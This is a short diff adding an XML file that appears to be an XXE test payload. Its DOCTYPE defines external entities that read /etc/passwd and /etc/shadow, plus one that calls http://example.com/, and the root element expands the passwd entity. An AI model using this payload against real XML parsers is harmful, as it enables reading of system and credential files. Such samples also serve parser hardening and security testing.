@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+<!ENTITY file SYSTEM "file:///etc/shadow">
+<!ENTITY network SYSTEM "http://example.com/">
+]>
+<root>
+    <data>&xxe;</data>
+</root>
